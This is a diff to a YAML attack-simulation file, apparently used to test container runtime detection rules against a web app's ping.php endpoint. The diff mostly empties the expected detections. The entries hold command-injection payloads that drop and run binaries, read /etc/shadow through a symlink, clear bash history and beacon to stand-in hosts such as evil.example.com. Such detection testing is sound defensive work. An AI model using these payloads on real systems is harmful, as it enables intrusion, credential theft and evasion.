@@ -42,10 +42,7 @@ attacks:
         ip: "169.254.169.254"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 3: EXECUTION (TA0002) — Command injection via ping.php
@@ -93,10 +90,7 @@ attacks:
         ip: "127.0.0.1;cp /bin/echo /dev/shm/malicious_webapp && chmod +x /dev/shm/malicious_webapp && /dev/shm/malicious_webapp pwned && rm -f /dev/shm/malicious_webapp"
     successIndicators:
       - bodyContains: "pwned"
-    expectedDetections:
-      - ruleID: R1000
-        ruleName: Exec from malicious source
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 5: PRIVILEGE ESCALATION (TA0004) — Container escape attempt
@@ -112,10 +106,7 @@ attacks:
         ip: "127.0.0.1;unshare -r id 2>&1 || echo unshare_blocked"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R1006
-        ruleName: Kernel Module Load
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
@@ -131,10 +122,7 @@ attacks:
         ip: "127.0.0.1;cp /bin/ls /tmp/drifted_webapp && /tmp/drifted_webapp / && rm -f /tmp/drifted_webapp"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R1001
-        ruleName: Exec Binary Not In Base Image
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # T1070.004 — Indicator Removal: clear bash history
   - name: cmdinject-history-clear
@@ -146,11 +134,7 @@ attacks:
         ip: "127.0.0.1;rm -f /root/.bash_history /home/*/.bash_history 2>/dev/null; echo cleared"
     successIndicators:
       - bodyContains: "cleared"
-    expectedDetections:
-      - ruleID: R0001
-        ruleName: Unexpected process launched
-        containerName: mywebapp-app
-        command: rm
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal secrets
@@ -230,10 +214,7 @@ attacks:
         ip: "127.0.0.1;ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R1010
-        ruleName: Symlink Created Over Sensitive File
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 8: DISCOVERY (TA0007) — Environment enumeration
@@ -266,9 +247,6 @@ attacks:
     successIndicators:
       - statusCode: 200
     expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: mywebapp-app
       - ruleID: R0001
         ruleName: Unexpected process launched
         containerName: mywebapp-app
@@ -324,10 +302,7 @@ attacks:
         ip: "127.0.0.1;getent hosts evil.attacker.example.com || echo dns_failed"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # T1048 — DNS beacon (curl variant)
   - name: cmdinject-dns-anomaly
@@ -339,10 +314,7 @@ attacks:
         ip: "127.0.0.1;curl -sm1 http://evil.example.com || true"
     successIndicators:
       - statusCode: 200
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: mywebapp-app
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 12: IMPACT (TA0040) — Crypto mining and resource hijacking
